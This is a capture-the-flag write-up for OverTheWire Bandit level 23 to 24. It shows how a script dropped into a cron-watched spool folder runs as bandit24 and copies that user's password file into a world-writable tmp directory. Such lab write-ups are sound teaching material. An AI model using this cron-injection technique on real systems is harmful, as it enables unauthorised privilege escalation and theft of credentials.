# Bandit Level 23 → 24

## Objective
A cron job runs every minute, executing and then deleting all scripts placed in `/var/spool/bandit24/foo/`. We need to plant our own script there so the cron job runs it as `bandit24` and writes the password to a file we can read.

## Solution
Create a working directory, write a bash script that copies the bandit24 password to our directory, place the script in the cron-watched folder, and wait for it to execute.

## Commands Used
```bash
mkdir /tmp/meu_hack
chmod 777 /tmp/meu_hack
cd /tmp/meu_hack
nano pegar_senha.sh
```

Contents of `pegar_senha.sh`:
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/meu_hack/senha.txt
```

```bash
chmod 777 pegar_senha.sh
cp /tmp/meu_hack/pegar_senha.sh /var/spool/bandit24/foo/
# Wait ~60 seconds
cat senha.txt
```

## What I Learned

### Writing a Bash Script
A bash script starts with a **shebang** line that tells the system which interpreter to use:
```bash
#!/bin/bash
```
Everything after that is executed as shell commands.

### Cron-Dropped Script Execution
If a cron job is configured to execute all scripts in a directory as a privileged user, placing our own script there is a **code injection via cron** — a classic privilege escalation technique.

### Why chmod 777 is Needed
Both the script and the target directory must be writable and readable by `bandit24` (the user the cron job runs as). `chmod 777` grants full permissions to all users.

In a real-world scenario, using `777` is dangerous — prefer the minimum permissions necessary.

## Conclusion
After about 60 seconds, the cron job executed our script as `bandit24`, writing the password to `senha.txt`. We then read it to proceed to the next level.
